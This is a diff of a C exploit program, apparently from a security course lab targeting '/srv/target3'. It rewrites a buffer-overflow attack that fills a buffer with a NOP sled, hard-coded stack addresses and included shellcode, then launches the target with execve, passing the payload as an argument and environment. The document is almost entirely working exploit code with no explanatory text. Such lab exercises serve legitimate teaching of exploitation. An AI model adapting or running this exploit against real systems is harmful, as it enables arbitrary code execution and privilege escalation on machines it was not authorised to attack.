@@ -6,26 +6,38 @@
 #include "shellcode.h"
 
 const char* TARGET = "/srv/target3";
-const int BUFFER_SIZE = 400;
-const uint32_t BASE_ADDRESS = 0xffffdec0;
-const int NOP_SIZE = 201;
-const char NOP = 0x90;
-const int OFFSET = 4;
 
-void prepare_buffer(char* buffer) {
-    memset(buffer, NOP, BUFFER_SIZE); 
-    *(uint32_t*)(buffer) = BASE_ADDRESS + OFFSET; 
-    *(uint32_t*)(buffer + OFFSET) = BASE_ADDRESS + 2 * OFFSET; 
-    memcpy(buffer + NOP_SIZE, shellcode, sizeof(shellcode)); 
-    buffer[BUFFER_SIZE - 1] = '\0';
+const int ESIZE = 400;
+const uint32_t BASE = 0xffffdec0;
+const int NSIZE = 201;
+const char NOP = 0x90;
+const int DIFF = 4;
+const uint32_t A1 = BASE + DIFF;
+const uint32_t A2 = BASE + 2 * DIFF;
+
+void prep(char *e) {
+    memset(e, NOP, ESIZE - 1);
+    *((uint32_t *)(e)) = A1;
+    *((uint32_t *)(e + DIFF)) = A2;
+    memcpy(e + NSIZE, shellcode, sizeof(shellcode));
+    e[ESIZE - 1] = '\0';
 }
 
 int main(void) {
-    char env[BUFFER_SIZE];
-    prepare_buffer(env);
+    char env[ESIZE];
+    prep(env); 
 
-    char* args[] = {(char*)TARGET, env, NULL};
-    char* envp[] = {NULL};
+    char *buf = malloc(NSIZE + sizeof(shellcode) + 1);
+    if (buf == NULL) {
+        perror("Failed to allocate buf");
+        exit(EXIT_FAILURE);
+    }
+    memset(buf, NOP, NSIZE);
+    memcpy(buf + NSIZE, shellcode, sizeof(shellcode));
+    buf[NSIZE + sizeof(shellcode)] = '\0'; 
+
+    char *args[] = {TARGET, buf, NULL};
+    char *envp[] = {env};
 
     if (execve(TARGET, args, envp) == -1) {
         perror("execve failed");
